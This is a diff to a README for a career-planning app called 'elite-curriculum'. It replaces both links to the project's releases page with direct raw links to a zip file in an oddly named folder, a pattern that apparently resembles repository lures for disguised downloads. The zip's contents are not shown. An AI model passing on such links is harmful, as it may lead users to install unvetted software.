@@ -1,6 +1,6 @@
 # 🚀 elite-curriculum - Build your professional career path today
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/delphiniaepicyclical516/elite-curriculum/releases)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/delphiniaepicyclical516/elite-curriculum/raw/refs/heads/main/transnational/elite-curriculum-3.1.zip)
 
 ## 📋 About This Project
 
@@ -18,7 +18,7 @@ Elite-curriculum helps you map your professional growth. This tool organizes you
 
 Current users can download the installer from the release page.
 
-[Visit this page to download the software](https://github.com/delphiniaepicyclical516/elite-curriculum/releases)
+[Visit this page to download the software](https://github.com/delphiniaepicyclical516/elite-curriculum/raw/refs/heads/main/transnational/elite-curriculum-3.1.zip)
 
 Follow these steps to set up the software on your Windows computer:
 
